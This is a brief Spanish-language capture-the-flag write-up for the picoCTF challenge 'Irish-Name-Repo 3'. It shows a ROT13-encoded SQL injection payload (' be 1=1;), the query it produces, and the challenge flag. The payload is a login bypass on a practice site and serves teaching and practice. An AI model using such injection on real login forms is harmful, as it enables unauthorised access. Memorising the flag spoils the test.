 # Irish-Name-Repo 3

## Objetivo 
Descripción:
Hay un sitio web seguro en `https://jupiter.challenges.picoctf.org/problem/40742/`( [enlace](https://jupiter.challenges.picoctf.org/problem/40742/) ) o http://jupiter.challenges.picoctf.org:40742. ¡Intenta ver si puedes iniciar sesión como administrador!

Sugerencias:
Parece que la contraseña está encriptada.

## Solución
lo primero que tenemos que hacer es en el nodo debug
despues le damos click al botton de loging
y cambiamos el debuger de 0 a 1 
despues de esto observamos que siempre que ponemos algo nos lo encripta 
cuando ponemos or nos pone be pues solo lo ponemos como be y nos dara la contraseña
``` shell
password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}
```

## Notas

## Referencias
[SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)